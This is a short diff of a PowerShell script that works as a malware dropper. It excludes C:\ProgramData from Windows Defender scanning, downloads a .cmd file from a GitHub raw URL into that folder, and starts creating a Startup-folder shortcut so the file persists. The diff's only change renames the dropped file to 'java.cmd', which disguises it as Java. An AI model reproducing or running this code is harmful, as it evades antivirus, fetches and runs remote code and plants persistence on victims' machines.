@@ -2,7 +2,7 @@ Set-MpPreference -ExclusionPath C:\ProgramData
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $down = New-Object System.Net.WebClient
 $url = 'https://github.com/qwertyuiopindia/log/raw/main/java.cmd?raw=true'
-$file = "C:\ProgramData\AW_prod.cmd"
+$file = "C:\ProgramData\java.cmd"
 $down.DownloadFile($url,$file)
 $objShell = New-Object -ComObject ("WScript.Shell")
 $objShortCut = $objShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" + "\Java.lnk")
